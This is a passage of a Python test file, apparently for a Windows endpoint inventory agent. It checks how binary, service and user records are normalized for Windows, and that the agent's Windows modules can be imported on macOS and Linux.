                "name": "cmd.exe", "hash_sha256": "deadbeef",
                "size_bytes": 100000, "modified_at": 1700000000,
                "signed": None}]
        out = self._n("binaries", raw)
        assert out[0]["suid"] is None         # UNIX concept
        assert out[0]["world_writable"] is None

    # services — start/stop pending → unknown
    def test_services_transitional_state(self):
        raw = [{"name": "WinHTTPAutoProxySvc", "status": "start_pending",
                "enabled": True, "pid": None, "type": "winsvc", "description": None}]
        out = self._n("services", raw)
        assert out[0]["status"] == "unknown"

    # users — shell and uid always None
    def test_users_no_unix_fields(self):
        raw = [{"name": "Bob", "uid": None, "gid": None, "shell": None,
                "home": r"C:\Users\Bob", "last_login": None,
                "admin": False, "locked": False}]
        out = self._n("users", raw)
        assert out[0]["shell"] is None
        assert out[0]["uid"] is None


# ═══════════════════════════════════════════════════════════════════════════════
# 15. Importability — all Windows modules importable on non-Windows
# ═══════════════════════════════════════════════════════════════════════════════

class TestImportability:
    """Verify that no Windows module raises at import time on macOS/Linux."""

    def test_normalizer_importable(self):
        import agent.os.windows.normalizer  # noqa: F401

    def test_keystore_importable(self):
        import agent.os.windows.keystore  # noqa: F401

    def test_collectors_base_importable(self):
        import agent.os.windows.collectors.base  # noqa: F401

    def test_collectors_volatile_importable(self):
        import agent.os.windows.collectors.volatile  # noqa: F401

    def test_collectors_network_importable(self):
        import agent.os.windows.collectors.network  # noqa: F401

    def test_collectors_system_importable(self):
        import agent.os.windows.collectors.system  # noqa: F401

    def test_collectors_posture_importable(self):
        import agent.os.windows.collectors.posture  # noqa: F401

    def test_collectors_inventory_importable(self):
        import agent.os.windows.collectors.inventory  # noqa: F401

    def test_service_importable(self):
        import agent.os.windows.service  # noqa: F401

    def test_watchdog_svc_importable(self):
        import agent.os.windows.watchdog_svc  # noqa: F401
